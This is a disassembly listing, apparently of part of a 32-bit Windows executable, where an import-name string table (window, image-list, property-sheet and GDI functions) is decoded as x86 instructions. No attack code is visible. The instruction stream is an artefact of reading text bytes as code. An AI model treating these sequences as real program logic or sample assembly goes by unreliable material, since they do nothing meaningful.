  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
